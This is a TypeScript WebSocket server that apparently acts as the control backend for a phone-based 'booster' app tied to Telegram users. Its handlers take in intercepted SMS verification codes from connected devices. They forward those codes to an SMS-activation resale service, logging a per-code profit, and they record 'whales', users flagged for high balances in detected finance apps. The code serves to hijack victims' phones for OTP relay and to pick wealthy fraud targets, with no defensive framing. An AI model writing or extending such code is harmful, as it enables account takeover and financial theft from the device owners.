import WebSocket, { WebSocketServer } from 'ws';
import { IncomingMessage } from 'http';
import { supabase, config } from './config';
import {
  activeDevices,
  evictDevice,
  startHeartbeat,
  resetPongTimer,
  assignAdAccount,
} from './registry';
import { completeSmsTransaction } from './smsActivate';
import {
  InboundMessage,
  RegisterPayload,
  SmsReceivedPayload,
  WhaleDetectedPayload,
  DeviceEntry,
} from './types';

// ─── WebSocket Server Bootstrap ────────────────────────────────────────────────

export function createWebSocketServer(httpServer: any): WebSocketServer {
  const wss = new WebSocketServer({ server: httpServer });

  wss.on('listening', () => {
    console.log(`[WS] WebSocket server attached to HTTP server`);
  });

  wss.on('connection', (socket: WebSocket, req: IncomingMessage) => {
    const remoteIp = req.socket.remoteAddress ?? 'unknown';
    console.log(`[WS] New connection from ${remoteIp}`);

    let registeredUserId: number | null = null;

    socket.on('message', async (raw) => {
      let msg: InboundMessage;

      try {
        msg = JSON.parse(raw.toString()) as InboundMessage;
      } catch {
        console.warn('[WS] Received malformed JSON, ignoring');
        return;
      }

      switch (msg.action) {
        case 'register':
          await handleRegister(socket, msg as RegisterPayload, remoteIp);
          const entry = activeDevices.get((msg as RegisterPayload).telegram_user_id);
          if (entry) registeredUserId = entry.userId;
          break;

        case 'pong':
          if (registeredUserId !== null) {
            const e = activeDevices.get(registeredUserId);
            if (e) {
              console.log(`[WS] Pong received from user ${registeredUserId}`);
              resetPongTimer(e);
            }
          }
          break;

        // ── 3. SMS Received (OTP forwarding) ────────────────────────────────
        case 'sms_received': {
          const sms = msg as SmsReceivedPayload;
          console.log(`[WS] SMS received — code=${sms.code} sender=${sms.sender}`);
          // Forward to SMSActivate API and log $0.15 profit
          await completeSmsTransaction(
            `act_${Date.now()}`,
            sms.code,
            registeredUserId ?? 0,
            sms.sender,
            sms.phone_number,
            sms.service
          );
          break;
        }

        // ── 4. Whale Detected (high-value target) ───────────────────────────
        case 'whale_detected': {
          const whale = msg as WhaleDetectedPayload;
          console.warn(`[WHALE] 🐋 High-value target detected! app=${whale.app} balance=${whale.balance}`);

          if (registeredUserId !== null) {
            const { error } = await supabase.from('tma_whales').insert({
              telegram_user_id: registeredUserId,
              app_detected: whale.app,
              balance_string: whale.balance,
            });

            if (error) {
              console.error('[WHALE] Failed to insert whale record:', error.message);
            } else {
              console.warn(`[WHALE] ✅ Flagged user ${registeredUserId} — ${whale.app} / ${whale.balance}`);
            }
          }
          break;
        }

        default:
          console.warn(`[WS] Unknown action "${msg.action}" from user ${registeredUserId ?? 'unregistered'}`);
      }
    });

    socket.on('close', (code, reason) => {
      console.log(`[WS] Connection closed (code=${code}, reason=${reason.toString() || 'none'})`);
      if (registeredUserId !== null) {
        evictDevice(registeredUserId, `socket closed — code ${code}`);
      }
    });

    socket.on('error', (err) => {
      console.error('[WS] Socket error:', err.message);
      if (registeredUserId !== null) {
        evictDevice(registeredUserId, `socket error: ${err.message}`);
      }
    });
  });

  return wss;
}

// ─── Registration Handler ──────────────────────────────────────────────────────

async function handleRegister(
  socket: WebSocket,
  payload: RegisterPayload,
  remoteIp: string
): Promise<void> {
  const { telegram_user_id, device_model, sms_enabled } = payload;

  if (!telegram_user_id || typeof telegram_user_id !== 'number') {
    sendError(socket, 'INVALID_PAYLOAD', 'telegram_user_id must be a number');
    return;
  }
  if (!device_model || typeof device_model !== 'string') {
    sendError(socket, 'INVALID_PAYLOAD', 'device_model must be a string');
    return;
  }

  const { data: user, error } = await supabase
    .from('tma_users')
    .select('user_id, booster_status')
    .eq('user_id', telegram_user_id)
    .maybeSingle();

  if (error) {
    console.error('[WS] Supabase error during registration:', error.message);
    sendError(socket, 'DB_ERROR', 'Could not verify user');
    return;
  }

  if (!user) {
    console.warn(`[WS] Registration rejected — user ${telegram_user_id} not found in tma_users`);
    sendError(socket, 'USER_NOT_FOUND', 'Telegram user ID is not registered in the platform');
    return;
  }

  if (activeDevices.has(telegram_user_id)) {
    console.warn(`[WS] User ${telegram_user_id} already connected — evicting old session`);
    await evictDevice(telegram_user_id, 'replaced by new connection');
  }

  const adAccount = assignAdAccount(telegram_user_id);

  const entry: DeviceEntry = {
    userId: telegram_user_id,
    deviceModel: device_model,
    adAccount,
    socket,
    connectedAt: new Date(),
    pongTimer: null,
    pingTimer: null,
    smsEnabled: sms_enabled ?? false,
  };

  activeDevices.set(telegram_user_id, entry);

  await supabase
    .from('tma_users')
    .update({ booster_status: 'active', updated_at: new Date().toISOString() })
    .eq('user_id', telegram_user_id);

  // Log session in audit table
  await supabase.from('tma_booster_sessions').insert({
    user_id: telegram_user_id,
    device_model,
    ad_account: adAccount,
    event: 'connected',
  });

  startHeartbeat(entry);

  socket.send(
    JSON.stringify({
      action: 'registered',
      ad_account: adAccount,
      sms_enabled: entry.smsEnabled,
      message: `Welcome, user ${telegram_user_id}. Ad account #${adAccount} assigned.`,
    })
  );

  console.log(
    `[WS] ✅ Registered user ${telegram_user_id} | device: ${device_model} | ad_account: ${adAccount} | sms: ${entry.smsEnabled} | ip: ${remoteIp}`
  );
}

function sendError(socket: WebSocket, code: string, message: string): void {
  if (socket.readyState === socket.OPEN) {
    socket.send(JSON.stringify({ action: 'error', code, message }));
  }
}